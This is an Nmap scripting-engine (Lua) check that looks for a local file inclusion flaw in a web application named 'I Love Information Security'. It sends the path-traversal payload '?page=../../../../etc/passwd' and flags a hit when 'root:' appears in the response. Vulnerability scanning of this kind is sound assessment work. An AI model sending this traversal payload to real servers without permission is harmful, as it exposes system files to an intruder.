local shortport = require "shortport"
local stdnse = require "stdnse"
local http = require "http"

description = [[
This script detects the LFI vulnerability in I Love Information Security.
]]
categories = {"intrusive", "vuln", "exploit"}
author = "Wai Tuck <waituck@edgis-security.org"
license = "Same as Nmap---See https://nmap.org/book/man-legal.html"
portrule = shortport.http

action = function(host, port)
  local vuln_path = "?page=../../../../etc/passwd"
  local response = http.get(host, port, vuln_path)
  if response and response.status == 200 and response.body:match("root:") then
    return "LFI Detected"
  end
end
